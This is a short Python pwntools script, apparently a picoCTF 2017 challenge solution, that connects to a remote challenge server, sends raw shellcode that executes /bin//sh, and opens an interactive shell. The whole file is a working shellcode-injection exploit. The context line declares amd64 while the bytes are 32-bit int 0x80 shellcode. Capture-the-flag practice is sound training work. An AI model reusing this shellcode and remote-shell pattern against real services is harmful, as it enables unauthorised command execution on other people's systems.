from pwn import *
context(arch='amd64', os='linux')
r = remote('shell2017.picoctf.com', 38782)
r.recv(4096)
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
r.send(shellcode)
r.interactive()
